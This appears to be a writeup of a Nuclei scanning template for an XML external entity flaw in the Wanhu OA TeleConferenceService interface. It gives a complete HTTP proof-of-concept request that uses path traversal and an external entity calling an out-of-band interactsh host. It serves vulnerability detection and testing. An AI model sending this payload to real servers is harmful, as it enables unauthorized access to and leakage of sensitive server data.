# Nuclei Template: Wanhu OA TeleConferenceService Interface - XML External Entity Injection
**Template ID:** wanhu-teleconferenceservice-xxe
**Vulnerability Class:** XML External Entities (XXE)
**Severity:** High
**CWE:** CWE-611
**Source:** Nuclei Template (`wanhu-teleconferenceservice-xxe.yaml`)

## Vulnerability Information & PoC

## Description
There is an XXE injection vulnerability in the Wanhu OA TeleConferenceService interface. An attacker can use the vulnerability to continue XXE injection to obtain sensitive information on the server.

## Steps to reproduce / Exploit Payload
```http
POST /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../TeleConferenceService HTTP/1.1
Host: {{Hostname}}

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY xxe SYSTEM "http://{{interactsh-url}}" >]>
<value>&xxe;</value>
```

## References
- http://wiki.peiqi.tech/wiki/oa/万户OA/万户OA%20TeleConferenceService%20XXE注入漏洞.html
- https://github.com/Threekiii/Awesome-POC/blob/master/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E4%B8%87%E6%88%B7OA%20TeleConferenceService%20XXE%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
